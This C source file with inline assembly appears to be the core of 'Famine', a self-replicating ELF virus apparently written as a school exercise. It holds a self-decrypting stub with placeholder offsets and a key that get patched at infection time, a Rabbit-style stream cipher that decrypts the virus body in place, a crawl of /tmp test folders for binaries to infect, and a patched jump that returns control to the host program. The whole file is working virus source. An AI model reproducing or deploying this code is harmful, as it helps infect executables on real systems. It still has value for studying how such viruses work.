#include "../includes/famine.h"

void decrypt() {
	__asm__(
		// save registers
		"push %rsp \n"
		"push %rax \n"
		"push %rcx \n"
		"push %rdx \n"
		"push %rbx \n"
		"push %rsi \n"
		"push %rdi \n"
		"push %rbp \n"
		"push %r8 \n"
		"push %r9 \n"
		"push %r10 \n"
		"push %r11 \n"
		"push %r12 \n"
		"push %r13 \n"
		"push %r14 \n"
		"push %r15 \n"
	);

	unsigned char *start;						
	__asm__(
		"lea 0x39393939(%%rip), %0 \n"
		: "=p" (start)
	);
	// len to be replaced
	int encrypt_size = 0x40404040;
	// key to be replaced				
	char key[16] = "KKKKKKKKKKKKKKKK";
	int __attribute__((unused)) spot = 0x41414141;


	unsigned int 	X[8];
	unsigned int 	C[8];
	short			K[16];
	unsigned int 	G[8];
	unsigned int 	A[8];
	unsigned int 	b = 0;
	short			S[8];

	//ft_bzero(X, 8 * sizeof(unsigned int));
	for (int i = 0; i < 8; ++i)
		X[i] = 0;
	//ft_bzero(C, 8 * sizeof(unsigned int));
	for (int i = 0; i < 8; ++i)
		C[i] = 0;
	//ft_bzero(K, 8 * sizeof(short));
	for (int i = 0; i < 8; ++i)
		K[i] = 0;
	//ft_bzero(G, 8 * sizeof(unsigned int));
	for (int i = 0; i < 8; ++i)
		G[i] = 0;
	//ft_bzero(A, 8 * sizeof(unsigned int));
	for (int i = 0; i < 8; ++i)
		A[i] = 0;

	// init K
	for (int i = 0; i < 16; ++i)
	{
		if (i % 2 == 0)
			K[i/2] = (key[i] << 8) + key[i+1];
	}

	// Key Setup Scheme
	for (int i = 0; i < 8; ++i)
	{
		if (i % 2 == 0)
		{
			X[i] = K[(i + 1) % 8] | K[i];
			C[i] = K[(i + 4) % 8] | K[(i + 5) % 8];
		}
		else
		{
			X[i] = K[(i + 5) % 8] | K[(i + 4) % 8];
			C[i] = K[i] | K[(i + 1) % 8];
		}
	}

	// intit A
	A[0] = 0x4D34D34D;
	A[1] = 0xD34D34D3;
	A[2] = 0x34D34D34;
	A[3] = 0x4D34D34D;
	A[4] = 0xD34D34D3;
	A[5] = 0x34D34D34;
	A[6] = 0x4D34D34D;
	A[7] = 0xD34D34D3;

	// init KEY loop
	for (int n = 0; n < 4; ++n)
	{
		// Counter System
		for (int i = 0; i < 8; ++i)
		{
			unsigned int temp = C[i] + A[i] + b;
			b = temp / WORDSIZE;
			C[i] = temp % WORDSIZE;
		}

		// Next-State Function
		for (int i = 0; i < 4; ++i)
		{
			for (int j = 0; j < 8; ++j)
				G[j] = FG(X[j], C[j]);

			X[0] = G[0] + (G[7] << 16) + (G[6] << 16) % WORDSIZE;
			X[1] = G[1] + (G[0] <<  8) +  G[7]        % WORDSIZE;
			X[2] = G[2] + (G[1] << 16) + (G[0] << 16) % WORDSIZE;
			X[3] = G[3] + (G[2] <<  8) +  G[1]        % WORDSIZE;
			X[4] = G[4] + (G[3] << 16) + (G[2] << 16) % WORDSIZE;
			X[5] = G[5] + (G[4] <<  8) +  G[3]        % WORDSIZE;
			X[6] = G[6] + (G[5] << 16) + (G[4] << 16) % WORDSIZE;
			X[7] = G[7] + (G[6] <<  8) +  G[5]        % WORDSIZE;
		}
	}

	int done = 0;
	int str_c = 0;
	while (!done)
	{
		S[0] = ((short *)X)[0] ^ ((short *)X)[11];
		S[1] = ((short *)X)[1] ^ ((short *)X)[6];
		S[2] = ((short *)X)[4] ^ ((short *)X)[15];
		S[3] = ((short *)X)[5] ^ ((short *)X)[10];
		S[4] = ((short *)X)[8] ^ ((short *)X)[3];
		S[5] = ((short *)X)[9] ^ ((short *)X)[14];
		S[6] = ((short *)X)[12] ^ ((short *)X)[7];
		S[7] = ((short *)X)[13] ^ ((short *)X)[2];

		// decrypt
		int n = 0;
		for (n = 0; n < 16; ++n)
		{
			if (str_c + n < encrypt_size)
			{
				start[str_c + n] ^= ((char*)S)[n];						// DECRYPT
				//start[str_c + n] = 0;
			}
			else
			{
				done = 1;
				break;
			}
		}
		str_c += n;
		
		// Counter System
		for (int i = 0; i < 8; ++i)
		{
			unsigned int temp = C[i] + A[i] + b;
			b = temp / WORDSIZE;
			C[i] = temp % WORDSIZE;
		}

		// Next-State Function
		for (int i = 0; i < 4; ++i)
		{
			for (int j = 0; j < 8; ++j)
				G[j] = FG(X[j], C[j]);

			X[0] = G[0] + (G[7] << 16) + (G[6] << 16) % WORDSIZE;
			X[1] = G[1] + (G[0] <<  8) +  G[7]        % WORDSIZE;
			X[2] = G[2] + (G[1] << 16) + (G[0] << 16) % WORDSIZE;
			X[3] = G[3] + (G[2] <<  8) +  G[1]        % WORDSIZE;
			X[4] = G[4] + (G[3] << 16) + (G[2] << 16) % WORDSIZE;
			X[5] = G[5] + (G[4] <<  8) +  G[3]        % WORDSIZE;
			X[6] = G[6] + (G[5] << 16) + (G[4] << 16) % WORDSIZE;
			X[7] = G[7] + (G[6] <<  8) +  G[5]        % WORDSIZE;
		}
	}
	
	__asm__(
		"jmp main + 0x24 \n"
	);
}

int main(void) {
	__asm__(
		// save registers
		"push %rsp \n"
		"push %rax \n"
		"push %rcx \n"
		"push %rdx \n"
		"push %rbx \n"
		"push %rsi \n"
		"push %rdi \n"
		"push %rbp \n"
		"push %r8 \n"
		"push %r9 \n"
		"push %r10 \n"
		"push %r11 \n"
		"push %r12 \n"
		"push %r13 \n"
		"push %r14 \n"
		"push %r15 \n"
	);

	// signature
	char *str = "Famine version 1.0 (c)oded by eparisot\n";
	if (DEBUG) syscall_write(1, str, 39);

	// folders crawl
	listdir("/tmp/test/");
	listdir("/tmp/test2/");

	__asm__(
		// restore registers
		"pop %r15 \n"	
		"pop %r14 \n"
		"pop %r13 \n"
		"pop %r12 \n"
		"pop %r11 \n"				 
		"pop %r10 \n"
		"pop %r9 \n"
		"pop %r8 \n"
		"pop %rbp \n"
		"pop %rdi \n"
		"pop %rsi \n"
		"pop %rbx \n"
		"pop %rdx \n"
		"pop %rcx \n"
		"pop %rax \n"
		"pop %rsp \n"
		"add $0x138, %rsp \n" // restore stack so argv is in correct place
		// set return here for fist call to avoid segfault, will be replaced by NOP in subsequent runs
		"leave \n" 
		"ret \n"
		// jump back to main
		"jmp . + 5 + 0x41414141 \n"
		// anchor to look for to replace jmp address (0x42424242 location - 7)
		"push 0x42424242 \n"
	);

	return 0;
}